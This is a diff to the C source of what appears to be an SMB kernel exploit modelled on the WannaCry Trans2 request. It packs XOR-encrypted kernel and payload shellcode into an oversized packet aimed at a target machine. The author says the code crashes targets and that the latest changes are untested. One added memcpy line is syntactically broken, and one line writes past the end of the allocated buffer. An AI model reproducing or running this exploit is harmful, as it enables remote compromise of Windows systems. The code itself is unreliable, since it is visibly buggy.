@@ -3,6 +3,10 @@
 WARNING: This code works for me as of March 7th 2021 but it BSODS the target
 
 It could be because my kernel shellcode doesn't contain the payload shellcode length after it
+
+11/8/2021: Added code to attach the shellcode length after the kernel shellcode.
+11/8/2021: Fixed the encrypted buffer length to 4179 ( send 4178 bytes & null terminate at 4179)
+11/8/2021: Code is still untested
 */
 
 #include <windows.h>
@@ -289,6 +293,10 @@ int main(int argc, char* argv[])
 
 	//copy kernel shellcode to encrypted buffer
 	memcpy((unsigned char*)encrypted, kernel_shellcode, kernel_shellcode_size);
+	
+	//add the payload shellcode length after the kernel shellcode
+	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]); //or statically put your own value here
+	memcpy(unsigned char)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, sizeof(DWORD));
 
 	//TO FIX:
 	//Shellcode is BSODing the target because the length of the payload shellcode is not added
@@ -306,14 +314,15 @@ int main(int argc, char* argv[])
 	*/
 	
 	//copy payload shellcode to encrypted buffer
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size, shellcode, payload_shellcode_size);
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 4, shellcode, payload_shellcode_size);
 
 	//Xor the data buffer with the calculated key
 	xor_payload(XorKey, (unsigned char*)encrypted, 4096);
 
 	//allocate memory for the big packet
-	unsigned char* big_packet = (unsigned char*)malloc(4178);
-	memset((unsigned char*)big_packet, 0x00, 4178);
+	unsigned char* big_packet = (unsigned char*)malloc(4178+1);
+	memset((unsigned char*)big_packet, 0x00, 4178+1);
+	big_packet[4179] = '\0';
 
 	//copy wannacry skeleton packet to big Trans2 packet
 	memcpy((unsigned char*)big_packet, (char*)wannacry_Trans2_Request, 70);
